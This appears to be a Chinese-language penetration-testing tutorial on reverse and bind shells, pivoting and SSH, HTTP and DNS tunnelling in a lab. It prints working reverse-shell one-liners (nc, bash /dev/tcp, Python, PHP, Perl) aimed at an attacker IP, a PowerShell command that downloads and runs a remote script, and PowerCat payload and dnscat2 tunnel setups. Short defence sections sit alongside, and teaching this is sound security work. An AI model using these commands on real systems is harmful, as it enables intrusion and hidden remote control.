+<h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><p>Shell分为两种，一种是正向Shell，另一种是反向Shell。 如果客户端连接服务器，客户端想要获取服务器的Shell, 就称为正向Shell；如果客户端连接服务器，服务器想要获取客户端的Shell,就称为反向Shell。反向Shell通常用在开启了防护措施的目标机器上，例如防火墙过滤、端口转发等。<br><strong>正向shell</strong><br>在目标主机中输入如下命令，监听目标主机的4444端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -1vp 4444 -e /bin/sh                     //Linux</span><br><span class="line">nc -lvp 4444 -e c:\\windows\\system32\\cmd.exe //Windows</span><br></pre></td></tr></table></figure>
+
+<p>在kali攻击机输入如下命令，连接目标主机的4444端口<br><code>nc &lt;目标IP&gt; 4444</code></p>
+<p>可以在目标主机上看到 目标IP 正在连接本机。</p>
+<p><strong>反向shell</strong><br>kali攻击机输入如下命令，监听本地9999端口。<br><code>nc -lvp 9999</code></p>
+<p>在目标主机中输入如下命令，连接VPS主机192.168.220.165 的9999端口。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.220.165 9999 -e /bin/sh                    //Linux</span><br><span class="line">nc 192.168.220.165 9999 -e C:\windows\system32\cmd.exe//Windows </span><br></pre></td></tr></table></figure>
+
+<h3 id="在目标主机中没有nc时获取反向shell"><a href="#在目标主机中没有nc时获取反向shell" class="headerlink" title="在目标主机中没有nc时获取反向shell"></a>在目标主机中没有nc时获取反向shell</h3><p>在一般情况下，目标主机中是没有nc的。此时，可以使用其他工具和编程语言来代替nc，实现反向连接(下面的代码仅适用于目标主机为linux的情况)</p>
+<p>(1) Python反向shell<br>在kali攻击机上执行命令，监听本地4444端口。<br><code>nc -lvp 4444</code></p>
+<p>在目标主机上执行如下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect((&quot;192.168.220.165&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>(2) Bash反弹shell<br>在kali攻击机上执行命令，监听本地4444端口。<br><code>nc -lvp 4444</code></p>
+<p>在目标主机上执行如下命令<br><code>bash -i &gt;&amp; /dev/tcp/192.168.220.165/4444 0&gt;&amp;1</code></p>
+<p>(3) PHP反向shell<br>在kali攻击机上执行命令，监听本地4444端口。<br><code>nc -lvp 4444</code></p>
+<p>PHP常用在Web服务器上，它是nc、Perl 和Bash的一个很好的替代品。执行如下命令，实现PHP环境下的反弹Shell<br><code>php -r &#39;$sock=fsockopen(&quot;192.168.220.165,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p>
+<p>(4) Perl反向shell<br>在kali攻击机上执行命令，监听本地4444端口。<br><code>nc -lvp 4444</code></p>
+<p>如果此时目标主机使用的是Perl语言，仍然可以使用Perl来建立反向Shell。<br>在目标主机上运行如下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.220.165&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM, getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN, &quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h3><p>假设有三台主机A、B和C，其中B、C在内网环境中。主机A访问B，并获取了B的Shell；A不能直接访问C，可以通过B访问C。现在要获取C的shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在主机A：nc -lvp 4444</span><br><span class="line">在主机C：nc -lvp 9999 -e /bin/sh</span><br><span class="line">在主机B：nc -v &lt;主机A的IP地址&gt; 4444 -c <span class="string">&quot;nc -v &lt;主机C的IP地址&gt; 9999&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h2><p>PowerCat可以说是nc的PowerShell版本。PowerCat 可以通过执行命令回到本地运行，也可以使用远程权限运行。<br><strong>下载安装PowerCat</strong><br>打开命令行环境，执行git clone命令( 确保本地主机中安装了git 环境)下载PowerCat<br>下载完成后，在终端输入<br><code>cd powercat</code><br>即可进入PowerCat的目录。在PowerShell命令行环境中，要想使用powercat.ps1脚本，必须先进行导入操作。<br><code>Import-Module .\powercat.ps1</code></p>
+<p>如果提示未能加载指定模块，则可能是权限问题，输入下面命令修改权限<br><code>Set-ExecutionPolicy Unrestricted</code></p>
+<p>如果没有权限，也可以直接下载远程文件进行绕过。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object System.Net.Webclient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>powercat的使用</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-l      监听模式</span><br><span class="line">-p      指定监听端口</span><br><span class="line">-e      指定启动进程的名称</span><br><span class="line">-v      显示详情</span><br><span class="line">-c      指定想要连接的 IP 地址</span><br><span class="line">-ep     返回 powershell</span><br><span class="line">-dns    使用 dns 通信</span><br><span class="line">-g      生成 payload</span><br><span class="line">-ge     生成经过编码的 payload，可以直接使用 powershell -e 执行该 payload</span><br></pre></td></tr></table></figure>
+
+<p><strong>正向连接</strong><br>Kali 上的 nc 连接到靶机<br><code>nc -v 192.168.220.142 4444</code></p>
+<p>靶机开启监听，等待 Kali 连接<br><code>powercat -l -v -p 4444 -e cmd.exe</code></p>
+<p><strong>反向连接</strong><br>Kali 上开启监听<br><code>nc -lvp 4444</code></p>
+<p>靶机向 kali 发起连接<br><code>powercat -c 192.168.220.165 -p 4444 -e cmd.exe</code></p>
+<p><strong>返回powershell</strong><br>攻击机上运行<br><code>powercat -l -v -p 4444</code></p>
+<p>靶机上运行<br><code>powercat -c 192.168.220.165 -p 4444 -v -ep</code></p>
+<p><strong>powercat生成payload</strong><br>用PowerCat生成的Pylod也有正向和反向之分，且可以对其进行编码。尝试生成一个简单的Payload,在攻击机中执行如下命令。<br><code>powercat -1 -p 8000 -e cmd -v -g &gt;&gt; shell.ps1</code></p>
+<p>将生成的psl文件上传到靶机中并执行，然后在攻击机中执行如下命令,就可以获得一个反弹 Shell。<br><code>powercat -C 191.168.52.10 -P 8000 -V</code></p>
+<p>如果想反弹PowerShell,可以执行如下命令。<br><code>powercat -1 -P 8000 -ep -V -g &gt;&gt; shell.ps1</code></p>
+<p>用PowerCat也可以直接生成经过编码的Payload。在攻击机中执行如下命令，即可得到经过编码的Payload。<br><code>powercat -C 192.168.52.10 -P 9999 -ep -ge</code></p>
+<p>继续在攻击机中执行如下命令，并将Payload在靶机执行<br><code>powercat -1 -p 9999 -V</code></p>
+<p>虽然PowerCat的作者给出的说明是在PowerShell 2.0以上版本中就可以使用这个功能，但是根据测试，在PowerShell 4.0以下版本中使用这个功能时都会报错。</p>
+<p><strong>建立dns隧道连接</strong><br>powercat 的 dns 隧道是基于 dnscat 设计的，因此在服务端需要使用 dnscat 连接。<br>在服务端上安装 dnscat ，以 kali 为例</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure>
+
+<p>命令运行完之后，执行以下命令开启服务端<br><code>ruby dnscat2.rb powercat -e open --no-cache</code></p>
+<p>在靶机下，执行以下命令，建立 dns 隧道<br><code>powercat -c 192.168.220.165 -p 53 -dns powercat -e cmd.exe</code></p>
+<p><strong>将PowerCat作为跳板</strong><br>测试环境为：</p>
+<ul>
+<li>kali 192.168.220.165</li>
+<li>windows7 192.168.220.142&amp;&amp;192.168.52.10</li>
+<li>win2008 192.168.52.30</li>
+</ul>
+<p>将 win7 作为跳板机，让 kali 通过 win7 连接到 win2008<br>在 win2008 中执行以下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -v -p 4444 -e cmd.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用DNS协议：</span></span><br><span class="line">powercat -C -192.168.52.10 -p 8000 -v -e cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>在 win7 中执行以下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -v -p 5555 -r tcp:192.168.52.30:4444</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用DNS协议：</span></span><br><span class="line">powercat -1 -p 8000 -r dns:192.168.220.165::ttpowercat.test</span><br></pre></td></tr></table></figure>
+
+<p>最后在 kali 下连接 win7</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -v 172.16.214.2 5555</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用DNS协议：</span></span><br><span class="line">ruby dnscat2.rb ttpowercat.test -e open --no-cache</span><br></pre></td></tr></table></figure>
+
+<h1 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h1><p>应用层的隧道通信技术主要利用应用软件提供的端口来发送数据。常用的隧道协议有SSH、HTTP&#x2F;HTTPS和DNS。</p>
+<h2 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a>SSH协议</h2><p>在内网中，几乎所有的Linux&#x2F;UNIX服务器和网络设备都支持SSH协议。<br>在一般情况下，SSH协议是被允许通过防火墙和边界设备的，所以经常被攻击者利用。<br>同时，SSH协议的传输过程是加密的，所以我们很难区分合法的SSH会话和攻击者利用其他网络建立的隧道。<br>攻击者使用SSH端口隧道突破防火墙的限制后，能够建立一些之前无法建立的TCP连接。</p>
+<p>一个普通的SSH命令如下。<br><code>ssh root@192.168.1.1</code></p>
+<p>创建SSH隧道的常用参数说明如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-C：压缩传输，提高传输速度</span><br><span class="line">-f：将SSH传输转入后台执行，不占用当前的Shell</span><br><span class="line">-N：建立静默连接(建立了连接，但是看不到具体会话)</span><br><span class="line">-g：允许远程主机连接本地用于转发的端口</span><br><span class="line">-L：本地端口转发</span><br><span class="line">-R：远程端口转发</span><br><span class="line">-D：动态转发(SOCKS代理)</span><br><span class="line">-P：指定SSH端口</span><br></pre></td></tr></table></figure>
+
+<h3 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h3><p>实验环境<br><img src="/simg/tunnel_4.png" alt=" "></p>
+<ul>
+<li>kali攻击机：192.168.220.165</li>
+<li>web服务器(ubuntu)：192.168.220.145、192.168.52.132</li>
+<li>内网主机(win2003)：192.168.52.133</li>
+</ul>
+<p>以Web服务器192.168.220.145为跳板，将内网主机192.168.52.133 的3389端口映射到kali攻击机192.168.220.165的4444端口，再访问kali攻击机的4444端口，就可以访问192.168.52.133的3389端口了。</p>
+<p>kali攻击机上执行如下命令，会要求输入Web服务器(跳板机)的密码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 4444(VPS端口):192.168.52.133 (目标主机):80(目标端口) root@192.168.220.145(跳板机)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/simg/tunnel_5.png" alt=" "><br><img src="/simg/tunnel_6.png" alt=" "><br><img src="/simg/tunnel_7.png" alt=" "></p>
+<p>SSH进程的本地端口映射可以将本地(客户机)的某个端口转发到远端指定机器的指定端口；本地端口转发则是在本地(客户机)监听一个端口，所有访问这个端口的数据都会通过SSH隧道传输到远端的对应端口。</p>
+<h3 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h3><p>实验环境：</p>
+<ul>
+<li>kali攻击机：192.168.220.165</li>
+<li>web服务器(ubuntu)：192.168.220.145、192.168.52.132</li>
+<li>内网主机(win2003)：192.168.52.133</li>
+</ul>
+<p>以Web服务器为跳板，将kali攻击机的3307端口的流量转发到内网主机的3389端口，然后访问kali攻击机的3307端口，就可以访问内网主机的3389端口了。</p>
+<p>在Web服务器192.168.220.145上执行如下命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R 3307(kali攻击机端口):192.168.52.133(目标主机):3389(目标端口) root@192.168.220.165(kali攻击机ip)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/simg/tunnel_8.png" alt=" "></p>
+<p>在本地访问kali的3307端口，可以发现，已经与内网主机 的3389端口建立了连接<br><code>rdesktop 127.0.0.1:3307</code></p>
+<p>本地转发是将远程主机(服务器)某个端口的数据转发到本地机器的指定端口。<br>远程端口转发则是在远程主机上监听一个端口，所有访问远程服务器指定端口的数据都会通过SSH隧道传输到本地的对应端口。</p>
+<h3 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h3><p>实验环境：</p>
+<ul>
+<li>kali攻击机：192.168.220.165</li>
+<li>web服务器(ubuntu)：192.168.220.140、192.168.52.137</li>
+<li>内网主机(win2003)：192.168.52.133</li>
+</ul>
+<p>在kali攻击机上执行如下命令，建立一个动态的SOCKS 4&#x2F;5代理通道，输入Web服务器的密码。</p>
+<p><code>ssh -CfNg -D 7000 root@192.168.220.140</code></p>
+<p>接下来，在本地打开浏览器，设置网络代理。通过浏览器访问内网域控制器192.168.52.133<br>输入如下命令，查看本地7000端口是否已经连接。</p>
+<p><code>netstat -tulnp 1 grep &quot;: 7000&quot;</code></p>
+<p>动态端口映射就是建立一个SSH加密的SOCKS 4&#x2F;5代理通道。任何支持SOCKS 4&#x2F;5协议的程序都可以使用这个加密通道进行代理访问。</p>
+<h3 id="防御SSH隧道攻击的思路"><a href="#防御SSH隧道攻击的思路" class="headerlink" title="防御SSH隧道攻击的思路"></a>防御SSH隧道攻击的思路</h3><p>SSH隧道之所以能被攻击者利用，主要是因为系统访问控制措施不够。在系统中配置SSH远程管理白名单，在ACL中限制只有特定的IP地址才能连接SSH，以及设置系统完全使用带外管理等方法，都可以避免这一问题。</p>
+<p>如果没有足够的资源来建立带外管理的网络结构，在内网中至少要限制SSH远程登录的地址和双向访问控制策略(从外部到内部；从内部到外部)。</p>
+<h2 id="HTTP-x2F-HTTPS协议"><a href="#HTTP-x2F-HTTPS协议" class="headerlink" title="HTTP&#x2F;HTTPS协议"></a>HTTP&#x2F;HTTPS协议</h2><p>HTTP Service代理用于将所有的流量转发到内网。常见的代理工具有reGeorg、meterpreter 、tunna等。</p>
+<p>reGeorg是reDuh的升级版，主要功能是把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本机，实现基于HTTP协议的通信。reGeorg脚本的特征非常明显，很多杀毒软件都会对其进行查杀。</p>
+<p>reGeorg 支持ASPX、PHP、JSP 等Web脚本，并特别提供了一个Tomeat5版本。</p>
+<p>将脚本文件上传到目标服务器中，使用Kali Linux在本地访问远程服务器上的tunnel.jsp 文件。返回后，利用reGeorgSocksProxy.py脚本监听本地的9999端口，即可建立一个通信链路。</p>
+<p>输入如下命令，查看本地端口，可以发现9999端口已经开启了。</p>
+<p><code>python reGeorgSocksProxy.py -u http://192.168.220.140:8080/tunnel.jsp -p 9999</code></p>
+<p>隧道正常工作之后，可以在本地Kali Linux机器上使用ProxyChains之类的工具，访问目标内网中的资源。</p>
+<p>传统的Web服务器通常不会将本地的3389端口开放到公网，攻击者的暴力破解行为也很容易被传统的安全设备捕获。但是，如果使用HTTP隧道进行端口转发，不仅攻击者可以直接访问Web服务器的3389端口，而且暴力破解所产生的流量的特征也不明显。因此，在日常网络维护中，需要监控HTTP隧道的情况，及时发现问题。</p>
+<h2 id="DNS协议-1"><a href="#DNS协议-1" class="headerlink" title="DNS协议"></a>DNS协议</h2><p>DNS协议是一种请求&#x2F;应答协议，也是一种可用于应用层的隧道技术。虽然激增的DNS流量可能会被发现，但基于传统Socket隧道已经濒临淘汰及TCP、UDP通信大量被防御系统拦截的状况，DNS、ICMP、HTTP&#x2F;HTTPS 等难以被禁用的协议已成为攻击者控制隧道的主流渠道。</p>
+<p>一方面，在网络世界中，DNS是一个必不可少的服务；另一方面，DNS报文本身具有穿透防火墙的能力。由于防火墙和入侵检测设备大都不会过滤DNS流量，也为DNS成为隐蔽信道创造了条件。越来越多的研究证明，DNS隧道在僵尸网络和APT攻击中扮演着重要的角色。</p>
+<p>用于管理僵尸网络和进行APT攻击的服务器叫作C&amp;C服务器( Command and Control Server,命令及控制服务器)。C&amp;C节点分为两种，分别是C&amp;C服务端(攻击者)和C&amp;C客户端(被控制的计算机)。C&amp;C通信是指植入C&amp;C客户端的木马或者后门程序与C&amp;C服务端上的远程控制程序之间的通信。</p>
+<p>正常网络之间的通信，都是在两台机器之间建立TCP连接后进行的。在进行数据通信时：如果目标是IP地址，可以直接发送报文；如果目标是域名，会先将域名解析成IP地址，再进行通信。两台机器建立连接后, C&amp;C服务端就可以将指令传递给C&amp;C客户端上的木马(后门)程序，让其受到控制。</p>
+<p>内网中安装了各种软&#x2F;硬件防护设施来检查主机与外部网络的连接情况。很多厂商会收集C&amp;C服务端的域名、IP地址、URL等数据，帮助防火墙进行阻断操作。这样一来，C&amp;C通信就会被切断。于是，通过各种隧道技术实现C&amp;C通信的技术(特别是DNS隧道技术)出现了。</p>
+<p>DNS隧道的工作原理很简单：在进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠DNS协议即可进行数据包的交换。从DNS协议的角度看，这样的操作只是在一次次地查询某个特定的域名并得到解析结果，但其本质问题是，预期的返回结果应该是一个IP地址，而事实上不是——返回的可以是任意字符串，包括加密的C&amp;C指令。</p>
+<p>在使用DNS隧道与外部进行通信时，从表面上看是没有接连外网的(内网网关没有转发IP数据包)，但实际上，内网的DNS服务器进行了中转操作。这就是DNS隧道的工作原理，简单地说，就是将其他协议封装在DNS协议中进行传输。</p>
+<h3 id="查看DNS的连通性"><a href="#查看DNS的连通性" class="headerlink" title="查看DNS的连通性"></a>查看DNS的连通性</h3><p>首先，需要知道当前服务器是否允许通过内部DNS解析外部域名，也就是要测试DNS的连通性。</p>
+<p>输入如下命令，查询当前内部域名及IP地址。<br><code>cat /etc/resolv.conf|grep -v &#39;#&#39;</code></p>
+<p>输入如下命令，查看能否与内部DNS通信。可以看到，能够解析内部域名<br><code>nslookup ad.com</code></p>
+<p>输入如下命令,查询能否通过内部DNS服务器解析外部域名。可以看到，能够通过内部DNS服务器解析外部域名，这意味着可以使用DNS隧道实现隐蔽通信。<br><code>nslookup baidu.com</code></p>
+<h3 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h3><p>nscat2是一款开源软件。它使用DNS协议创建加密的C&amp;C通道，通过预共享密钥进行身份验证；使用Shell及DNS查询类型( TXT、MX、CNAME、A. AAAA),多个同时进行的会话类似于SSH中的隧道，dnscat2 是一个命令与控制工具。</p>
+<p>使用dnscat2隧道的模式有两种，分别是直连模式和中继模式。</p>
+<ul>
+<li>直连模式：客户端直接向指定IP地址的DNS服务器发起DNS解析请求。</li>
+<li>中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器。与直连模式相比，中继模式的速度较慢。</li>
+</ul>
+<p>如果目标内网放行所有的DNS请求，dnscat2 会使用直连模式，通过UDP的53端口进行通信(不需要域名，速度快，而且看上去仍然像普通的DNS查询)。在请求日志中，所有的域名都是以“dnscat”开头的，因此防火墙可以很容易地将直连模式的通信检测出来。</p>
+<p>如果目标内网中的请求仅限于白名单服务器或者特定的域, dnscat2会使用中继模式来申请一个域名，并将运行dnscat2服务端的服务器指定为受信任的DNS服务器。</p>
+<p>dnscat2通过DNS进行控制并执行命令。与同类工具相比，dnscat2 具有如下特点。</p>
+<ul>
+<li>支持多个会话。</li>
+<li>流量加密。</li>
+<li>使用密钥防止MiTM攻击。</li>
+<li>在内存中直接执行PowerShell脚本。</li>
+<li>隐蔽通信。</li>
+</ul>
+<h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><p>安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure>
+
+<p>使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动</span></span><br><span class="line">sudo ruby./dnscat2.rb abc.com --secret=123456  <span class="comment"># abc.com 自定义DNS传输的域名；--secret 自定义连接密码</span></span><br><span class="line">sudo ruby./dnscat2.rb --dns host=127.0.0.1,port=533 --secret=123456  <span class="comment">#设置监听端口</span></span><br><span class="line">sudo ruby./dnscat2.rb abc.com --secret=123456 --security=open --no-cache   <span class="comment">#--security 规定了安全级别；--no-cache 禁止缓存</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line">$ <span class="built_in">cd</span> dnscat2/client/</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure>
+
+<p>使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnscat --secret=123456 abc.com </span><br><span class="line">dnscat --dns server=&lt;your dnscat2 server ip&gt;,port=553 --secret=123456</span><br></pre></td></tr></table></figure>
+
+<p>具体的使用方法看官方手册</p>
+<h3 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h3><p>碘的原子序数为53，而这恰好是DNS的端口号，故该工具被命名为“iodine”</p>
+<p>iodine可以通过一台DNS服务器制造一个IPv4数据通道，特别适合在目标主机只能发送DNS请求的网络环境中使用。<br>iodine 是基于C语言开发的，分为服务端程序iodined 和客户端程序iodine。Kali Linux内置了iodine。<br>与同类工具相比，iodine 具有如下特点：</p>
+<ul>
+<li>不会对下行数据进行编码。</li>
+<li>支持多平台，包括Linux、 BSD、Mac OS、Windows。</li>
+<li>支持16个并发连接。</li>
+<li>支持强制密码机制。</li>
+<li>支持同网段隧道IP地址(不同于服务器一客户端网段)。</li>
+<li>支持多种DNS记录类型。</li>
+<li>提供了丰富的隧道质量检测措施。</li>
+</ul>
+<p>iodine支持直接转发和中继两种模式.<br>其原理是：通过TAP虚拟网卡，在服务端建立一个局域网；在客户端，通过TAP建立一个虚拟网卡；两者通过DNS隧道连接，处于同一个局域网(可以通过ping命令通信)。<br>在客户端和服务端之间建立连接后，客户机上会多出一块名为“dns0”的虚拟网卡。</p>
+<p>具体的使用方法看官方手册</p>
+<h3 id="防御DNS隧道攻击的方法"><a href="#防御DNS隧道攻击的方法" class="headerlink" title="防御DNS隧道攻击的方法"></a>防御DNS隧道攻击的方法</h3><p>防御隧道攻击并非易事，特别是防御DNS隧道攻击。通过如下操作，能够防御常见的隧道攻击行为。</p>
+<ul>
+<li>禁止网络中的任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信。</li>
+<li>虽然没有人会将TXT解析请求发送给DNS服务器，但是dnscat2和邮件服务器&#x2F;网关会这样做。因此，可以将邮件服务器&#x2F;网关列入白名单并阻止传入和传出流量中的TXT请求。</li>
+<li>跟踪用户的DNS查询次数。如果达到阈值，就生成相应的报告。</li>
+<li>阻止ICMP</li>
+</ul>
+<h1 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h1><p>常见的网络场景有如下三类。</p>
+<ul>
+<li>服务器在内网中，可以任意访问外部网络。</li>
+<li>服务器在内网中，可以访问外部网络，但服务器安装了防火墙来拒绝敏感端口的连接。</li>
+<li>服务器在内网中，对外只开放了部分端口(例如80端口),且服务器不能访问外部网络。</li>
+</ul>
+<h2 id="常用的SOCKS代理工具"><a href="#常用的SOCKS代理工具" class="headerlink" title="常用的SOCKS代理工具"></a>常用的SOCKS代理工具</h2><p>SOCKS是一种代理服务，可以简单地将一端的系统连接另一端。 SOCKS支持多种协议，包括HTTP、FTP等。SOCKS分为SOCKS 4和SOCKS 5两种类型：SOCKS 4只支持TCP协议；SOCKS 5不仅支持TCP&#x2F;UDP协议，还支持各种身份验证机制等,其标准端口为1080。SOCKS能够与目标内网计算机进行通信，避免多次使用端口转发。</p>
+<p>SOCKS代理其实可理解为增强版的lcx。它在服务端监听一个服务端口，当有新的连接请求出现时，会先从SOCKS协议中解析出目标的URL的目标端口，再执行lcx的具体功能。SOCKS代理工具有很多，在使用时要尽可能选择没有GUI界面的。此外，要尽量选择不需要安装其他依赖软件的SOCKS代理工具，能够支持多平台的工具更佳。</p>
+<p>常用的SOCKS代理工具有：EarthWorm、reGeorg、sSocks、SocksCap64、Proxifier、ProxyChains</p>
+<h2 id="SOCKS代理技术在网络环境中的应用"><a href="#SOCKS代理技术在网络环境中的应用" class="headerlink" title="SOCKS代理技术在网络环境中的应用"></a>SOCKS代理技术在网络环境中的应用</h2><h3 id="EarthWorm的应用"><a href="#EarthWorm的应用" class="headerlink" title="EarthWorm的应用"></a>EarthWorm的应用</h3><p>EW的使用也非常简单，共有六种命令格式，分别是ssocksd、rcsocks、 rssocks、 lcx_slave、lcx_listen、 lex_tran。 其中，用于普通网络环境的正向连接命令是ssocksd,用于反弹连接的命令是resocks、rssocks, 其他命令用于复杂网络环境的多级级联。</p>
+<p>正向代理是指主动通过代理来访问目标机器，反向代理是指目标机器通过代理进行主动连接。</p>
+<p>工具链接：<a target="_blank" rel="noopener" href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p>
+<p><strong>测试环境：</strong><br><img src="/simg/tunnel_9.png" alt=" "></p>
+<ul>
+<li>kali攻击机：192.168.220.165</li>
+<li>web服务器(win7)：192.168.220.143、192.168.52.10</li>
+<li>内网主机(win2003)：192.168.52.20</li>
+</ul>
+<p>(1) 正向SOCKS 5服务器<br>以下命令适用于目标机器拥有一个外网IP地址的情况。<br><code>ew -s ssocksd -l 888</code><br>执行上述命令，即可架设一个端口为888的SOCKS代理。接下来，使用SocksCap64添加这个IP地址的代理即可。</p>
+<p>(2) 反弹SOCKS 5服务器<br>目标机器没有公网IP地址的情况具体如下(使其可以访问内网资源)。<br>首先，将EW上传到kali攻击机中，执行如下命令。<br><code>ew -s rcsocks -l 1080 -e 888</code><br>该命令的意思是：在公网VPS上添加一个转接隧道，把1080端口收到的代理请求转发给888端口。然后，将EW上传到Web服务器中，执行如下命令。<br><code>ew -s rssocks -d 192.168.220.165 -e 888</code><br>该命令的意思是：在IP地址为192.168.220.143的服务器上启动SOCKS5服务，然后，反弹到192.168.220.165kail攻击机的888端口。<br><img src="/simg/tunnel_10.png" alt=" "></p>
+<p>最后，可以在kali的命令行界面看到反弹成功。现在就可以通过访问192.168.220.165 kali攻击机的1080端口，使用在网络右侧IP地址为192.168.52.10的服务器上架设的SOCKS5代理服务了。</p>
+<p>(3) 二级网络环境(a)</p>
+<p><img src="/simg/tunnel_11.png" alt=" "></p>
+<p>假设已经获得了A主机和B主机的控制权限。A主机配有两块网卡，一块能够连接外网，另一块(192.168.52.10)只能连接内网中的B主机，但无法访问内网中的其他资源。B主机可以访问内网资源，但无法访问外网。</p>
